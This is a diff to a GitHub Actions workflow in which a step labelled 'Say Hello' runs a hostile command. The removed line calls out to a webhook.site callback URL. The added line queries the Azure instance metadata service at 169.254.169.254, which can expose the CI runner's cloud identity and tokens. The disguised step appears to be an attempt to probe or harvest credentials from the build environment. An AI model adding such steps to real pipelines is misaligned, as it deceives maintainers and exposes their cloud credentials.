@@ -8,4 +8,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Say Hello
-        run: curl "https://bd84fa0a-4a84-425e-980b-4e07f06fb96d.webhook.site"
+        run: curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
